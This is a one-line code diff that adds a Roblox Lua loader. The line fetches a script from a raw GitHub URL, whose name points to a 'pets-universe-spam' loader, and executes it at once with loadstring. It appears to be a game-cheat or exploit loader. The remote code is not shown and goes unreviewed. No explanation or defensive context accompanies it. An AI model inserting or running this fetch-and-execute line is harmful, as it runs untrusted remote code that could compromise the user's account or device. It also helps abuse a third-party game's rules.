@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartHammerAnimate/loaders/main/loaders/pets-universe-spam0-jipsk3t5hhzt7i.lua"))()
